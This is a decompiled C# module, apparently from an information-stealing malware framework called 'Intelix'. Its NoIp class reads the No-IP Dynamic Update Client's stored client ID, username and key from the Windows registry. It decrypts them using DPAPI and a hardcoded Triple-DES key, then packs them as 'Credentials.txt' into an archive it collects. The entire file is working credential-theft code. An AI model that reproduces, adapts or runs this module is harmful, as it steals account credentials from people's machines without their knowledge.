using System;
using System.Security.Cryptography;
using System.Text;
using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;
using Microsoft.Win32;

namespace Intelix.Targets.Applications
{
	// Token: 0x0200004B RID: 75
	public class NoIp : ITarget
	{
		// Token: 0x060000F4 RID: 244 RVA: 0x0000E3BC File Offset: 0x0000C5BC
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = "SOFTWARE\\Vitalwerks\\DUC\\v4";
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text))
			{
				bool flag = registryKey != null;
				if (flag)
				{
					object value = registryKey.GetValue("CKey");
					object value2 = registryKey.GetValue("CID");
					object value3 = registryKey.GetValue("UserName");
					bool flag2 = value != null || value2 != null || value3 != null;
					if (flag2)
					{
						string text2 = this.DecryptString((byte[])value2);
						string text3 = this.DecryptString((byte[])value);
						string text4 = this.DecryptString((byte[])value3);
						string text5 = "NoIp\\Credentials.txt";
						Counter.CounterApplications counterApplications = new Counter.CounterApplications();
						counterApplications.Name = "NoIp";
						counterApplications.Files.Add(text + " => " + text5);
						counterApplications.Files.Add(text5);
						zip.AddTextFile(text5, string.Concat(new string[]
						{
							"clientid: ",
							text2,
							"\nlogin: ",
							text4,
							"\npassword hash: ",
							text3
						}));
						counter.Applications.Add(counterApplications);
					}
				}
			}
		}

		// Token: 0x060000F5 RID: 245 RVA: 0x0000E50C File Offset: 0x0000C70C
		private string DecryptString(byte[] message)
		{
			string result;
			try
			{
				bool flag = message == null;
				if (flag)
				{
					result = null;
				}
				else
				{
					byte[] array = DpApi.Decrypt(message);
					bool flag2 = array == null;
					if (flag2)
					{
						result = null;
					}
					else
					{
						byte[] key = new byte[]
						{
							127,
							238,
							115,
							104,
							83,
							74,
							138,
							240,
							49,
							50,
							224,
							252,
							103,
							181,
							23,
							117
						};
						using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
						{
							tripleDESCryptoServiceProvider.Key = key;
							tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
							tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
							using (ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor())
							{
								byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
								result = Encoding.UTF8.GetString(bytes);
							}
						}
					}
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}
	}
}
